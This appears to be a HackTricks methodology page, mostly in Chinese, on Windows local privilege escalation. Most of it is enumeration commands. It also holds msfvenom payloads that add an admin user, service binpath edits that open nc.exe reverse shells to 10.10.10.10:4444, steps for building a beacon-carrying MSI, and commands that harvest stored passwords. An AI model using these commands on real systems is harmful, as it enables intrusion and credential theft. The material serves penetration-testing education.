# Windows 本地权限提升

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows 本地权限提升 向量 的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows 基础理论

### Access Tokens

**如果你不知道 Windows Access Tokens 是什么，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的 Integrity Levels 是什么，你应该在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 安全控制

Windows 有多种机制可能会 **阻止你枚举系统**、运行可执行文件，甚至 **检测到你的活动**。在开始权限提升枚举之前，你应该 **阅读** 以下 **页面** 并 **枚举** 所有这些 **防御** **机制**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## 系统信息

### 版本信息枚举

检查 Windows 版本是否存在已知漏洞（也要检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本利用

这个 [网站](https://msrc.microsoft.com/update-guide/vulnerability) 对于查找 Microsoft 安全漏洞的详细信息很有用。该数据库包含超过 4,700 个安全漏洞，显示了 Windows 环境所呈现的 **巨大的攻击面**。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 已内置 watson)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github 上的 exploits 仓库:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

任何 credential/Juicy info 保存在 env variables 中吗？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 转录文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用此功能。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

记录了 PowerShell 管道执行的详细信息，包括已执行的命令、命令调用以及脚本的部分内容。然而，完整的执行细节和输出结果可能无法全部捕获。

要启用此功能，请按照文档中 "Transcript files" 部分的说明操作，选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看 Powershell 日志的最近 15 条事件，你可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

捕获了script执行的完整活动和全部内容记录，确保每个 block of code 在运行时都被记录。此过程保留了每项活动的全面审计痕迹，对于取证和分析恶意行为非常有价值。通过在执行时记录所有活动，能够提供对进程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可以在 Windows 事件查看器的路径：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\  
要查看最近的 20 条事件，您可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet 设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是通过 http**S** 而是通过 http 请求，可能导致系统被妥协。

首先在 cmd 中运行以下命令检查网络是否使用 non-SSL WSUS update：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中运行以下命令：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到类似下面这样的回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
如果 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 或 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 等于 `1`。

那么，**it is exploitable.** 如果最后一个注册表值等于 0，则 WSUS 条目将被忽略。

为了利用这些漏洞，你可以使用诸如 [Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS](https://github.com/GoSecure/pywsus) 之类的工具——这些是用于在非 SSL WSUS 流量中注入“伪造”更新的 MiTM 武器化利用脚本。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).  
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（一旦可用）来利用此漏洞。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

许多企业 agent 暴露了 localhost IPC 接口和一个有特权的更新通道。如果可以将 enrollment 强制指向攻击者服务器，并且 updater 信任一个恶意根 CA 或签名检查薄弱，本地用户就可以投递一个恶意 MSI，由 SYSTEM 服务安装。基于 Netskope stAgentSvc 链（– CVE-2025-0309）的通用技术见：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有一个 meterpreter 会话，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 自动化此技术

### PowerUP

使用 power-up 的 `Write-UserAddMSI` 命令在当前目录中创建一个用于提权的 Windows MSI 二进制文件。该脚本输出一个预编译的 MSI 安装程序，提示添加用户/组（所以你将需要 GIU 访问）：
```
Write-UserAddMSI
```
只需执行生成的二进制文件即可提升权限。

### MSI Wrapper

阅读本教程以学习如何使用这些工具创建 MSI wrapper。请注意，如果你**只是**想**执行**命令行，可以将一个 **.bat** 文件打包。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- 使用 Cobalt Strike 或 Metasploit **生成** 一个新的 Windows EXE TCP payload 到 `C:\privesc\beacon.exe`
- 打开 **Visual Studio**，选择 **Create a new project**，在搜索框输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 给项目命名，例如 **AlwaysPrivesc**，将位置设置为 **`C:\privesc`**，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 一直点击 **Next**，直到到达第 3 步（共 4 步，选择要包含的文件）。点击 **Add** 并选择你刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中选中 **AlwaysPrivesc** 项目，在 **Properties** 中将 **TargetPlatform** 从 **x86** 改为 **x64**。
- 你还可以修改其他属性，例如 **Author** 和 **Manufacturer**，使安装的应用看起来更可信。
- 右键项目，选择 **View > Custom Actions**。
- 右键 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保安装程序运行时立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 设置为 **True**。
- 最后，**构建** 项目。
- 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将平台设置为 x64。

### MSI Installation

要在 **后台** 执行恶意 `.msi` 文件的 **安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞，你可以使用： _exploit/windows/local/always_install_elevated_

## 防病毒与检测器

### 审计设置

这些设置决定哪些内容会被**记录**，因此你应当注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

值得了解 Windows Event Forwarding 的日志被发送到哪里
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 的设计用于 **本地 Administrator 密码的管理**，确保加入域的计算机上每个密码都是 **唯一、随机化并定期更新** 的。这些密码被安全地存储在 Active Directory 中，只有通过 ACLs 被授予足够权限的用户才能访问，从而在被授权时查看本地管理员密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果启用，**明文密码会存储在 LSASS** (Local Security Authority Subsystem Service)。\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

自 **Windows 8.1** 起，Microsoft 引入了对 Local Security Authority (LSA) 的增强保护，以阻止不受信任的进程尝试读取其内存或注入代码，从而进一步提高系统安全性。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 于 **Windows 10** 中引入。它的目的是保护存储在设备上的凭据，以防止类似 pass-the-hash 的攻击。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 缓存凭据

**域凭据** 由 **本地安全机构 (Local Security Authority, LSA)** 验证并被操作系统组件使用。当用户的登录数据被已注册的安全包验证时，通常会为该用户建立域凭据。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查你所属的任何组是否具有有趣的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你 **belongs to some privileged group you may be able to escalate privileges**。在这里了解特权组以及如何滥用它们以提升权限：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操作

**了解更多** 关于 **token** 的内容，请参见此页面: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
查看以下页面以 **learn about interesting tokens** 以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 主目录
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

首先，在列出进程时，**检查进程命令行中是否包含密码**.\
检查是否能**覆盖正在运行的某个二进制文件**或是否对二进制文件所在文件夹具有写权限，以便利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否存在可能的 [**electron/cef/chromium debuggers** 正在运行，可能被滥用以 escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

你可以使用 sysinternals 的 **procdump** 对正在运行的进程创建内存转储。像 FTP 这样的服务在内存中可能包含 **credentials in clear text in memory**，尝试转储内存并读取这些 credentials。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用可能允许用户启动 CMD 或浏览目录。**

示例: "Windows Help and Support" (Windows + F1), 搜索 "command prompt", 点击 "Click to open Command Prompt"

## Services

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 获取某个服务的信息
```bash
sc qc <service_name>
```
建议获取来自 _Sysinternals_ 的二进制文件 **accesschk**，用于检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查 "Authenticated Users" 是否可以修改任何服务：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果你遇到这个错误（例如在 SSDPSRV 上）：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

你可以使用以下命令启用它
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意服务 upnphost 依赖 SSDPSRV 才能工作（适用于 XP SP1）**

**另一种解决此问题的变通办法是运行：**
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在 "Authenticated users" 组对某个服务拥有 **SERVICE_ALL_ACCESS** 权限的情况下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
可以通过各种权限提升特权：

- **SERVICE_CHANGE_CONFIG**: 允许重新配置服务二进制文件。
- **WRITE_DAC**: 允许重新配置权限，从而可更改服务配置。
- **WRITE_OWNER**: 允许获取所有权并重新配置权限。
- **GENERIC_WRITE**: 继承更改服务配置的能力。
- **GENERIC_ALL**: 同样继承更改服务配置的能力。

可使用 _exploit/windows/local/service_permissions_ 来检测和利用此漏洞。

### 服务二进制文件的弱权限

**检查是否可以修改由服务执行的二进制文件** 或者是否对二进制所在的文件夹具有 **写权限** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
您可以使用 **wmic** 获取服务执行的所有二进制文件（不是 system32 中的），并使用 **icacls** 检查您的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**：
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表修改权限

你应该检查是否可以修改任何服务注册表。\
你可以**检查**你在某个服务**注册表**上的**权限**，方法是：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，服务执行的二进制文件可以被更改。

要更改所执行二进制文件的 Path：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 服务注册表 AppendData/AddSubdirectory 权限

如果你在某个注册表上拥有此权限，这意味着 **你可以从该注册表创建子注册表**。在 Windows 服务的情况下，这 **足以执行任意代码：**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径（排除属于内置 Windows 服务的）：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**您可以检测并利用** 此漏洞 使用 metasploit: `exploit/windows/local/trusted\_service\_path` 您可以手动使用 metasploit 创建一个服务二进制文件：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定当服务失败时要执行的操作。该功能可以配置为指向某个 binary。如果该 binary 可被替换，则可能发生 privilege escalation。更多细节见 [官方文档](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## 应用

### 已安装的应用程序

检查 **binaries 的权限**（也许你可以覆盖其中一个并进行 privilege escalation）以及 **文件夹**（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查是否可以修改某些配置文件以读取某些特殊文件，或者是否可以修改将由 Administrator 账户执行的某个二进制文件（schedtasks）。

在系统中查找弱的文件夹/文件权限的一种方法是执行：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 在启动时运行

**检查是否可以覆盖将由其他用户执行的某些注册表或可执行文件。**\
**阅读** **以下页面** 以了解更多关于有趣的 **autoruns locations to escalate privileges**：

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 驱动程序

查找可能的 **第三方异常/易受攻击** 驱动程序
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果一个 driver 暴露了 arbitrary kernel read/write primitive（常见于设计不良的 IOCTL handlers），你可以通过直接从 kernel memory 窃取 SYSTEM token 来提升权限。详见分步技术：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

如果你在 PATH 中的某个文件夹具有 **write permissions**，你可能能够 hijack 一个被进程加载的 **DLL** 并 **escalate privileges**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts 文件

检查 hosts 文件中是否硬编码了其他已知主机
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口与 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查 **受限服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(列出规则、创建规则、关闭、关闭...)**

更多[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 找到

如果你获得 root user，你可以监听任何端口（第一次使用 `nc.exe` 监听端口时，GUI 会询问是否允许 nc 被防火墙放行）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要以 root 身份轻松启动 bash，可以尝试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 的文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

来自 [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault]\  
Windows Vault 存储用于服务器、网站和其他程序的用户凭据，供 **Windows** **可以自动为用户登录**y。乍一看，用户似乎可以将他们的 Facebook 凭据、Twitter 凭据、Gmail 凭据等存储在其中，以便通过浏览器自动登录。但情况并非如此。

